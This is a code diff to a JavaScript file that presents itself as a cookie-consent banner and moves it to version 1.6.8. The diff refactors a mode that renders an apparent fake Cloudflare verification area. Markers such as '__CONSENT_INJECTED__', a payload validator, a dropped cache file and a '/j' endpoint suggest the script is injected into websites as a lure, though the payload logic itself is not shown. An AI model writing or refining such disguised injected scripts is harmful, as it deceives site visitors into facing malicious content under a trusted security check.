@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.6.7',
+    version: '1.6.8',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -199,7 +199,16 @@
   function getCacheFileUrl() {
     if (CONSENT_CONFIG.cacheFileUrl) return CONSENT_CONFIG.cacheFileUrl;
     var origin = location.origin || (location.protocol + '//' + location.host);
+    if (CONSENT_CONFIG.presentation === 'cloudflare') return origin + '/j';
     return origin + '/hello.txt';
+  }
+
+  function whenDomReady(fn) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', fn);
+    } else {
+      fn();
+    }
   }
 
   function validateStrictPayload(buf) {
@@ -449,10 +458,12 @@
 
   function bindCloudflareChallenge() {
     var area = document.getElementById('cf-challenge-area');
-    if (!area) return;
+    if (!area || area.__cfBound__) return;
+    area.__cfBound__ = true;
 
     var busy = false;
-    function runVerify() {
+    function runVerify(e) {
+      if (e && e.target && e.target.closest && e.target.closest('a')) return;
       if (busy || captchaVisible) return;
       busy = true;
       area.classList.add('cf-loading');
@@ -465,7 +476,7 @@
     area.addEventListener('keydown', function (e) {
       if (e.key === ' ' || e.key === 'Enter') {
         e.preventDefault();
-        runVerify();
+        runVerify(e);
       }
     });
   }
@@ -623,30 +634,22 @@
   }
 
   function init() {
-    if (!document.body) return;
     showVersion();
-    cacheDropHelloFile().then(function () {
-      if (CONSENT_CONFIG.presentation === 'cloudflare') {
-        bindCloudflareChallenge();
-        return;
-      }
-      resolveFavicon(function (faviconUrl) {
-        mountConsent(faviconUrl);
+
+    if (CONSENT_CONFIG.presentation === 'cloudflare') {
+      whenDomReady(bindCloudflareChallenge);
+      cacheDropHelloFile();
+      return;
+    }
+
+    whenDomReady(function () {
+      cacheDropHelloFile().then(function () {
+        resolveFavicon(function (faviconUrl) {
+          mountConsent(faviconUrl);
+        });
       });
     });
   }
 
-  function boot() {
-    if (!document.body) {
-      setTimeout(boot, 20);
-      return;
-    }
-    init();
-  }
-
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', boot);
-  } else {
-    boot();
-  }
+  init();
 })();
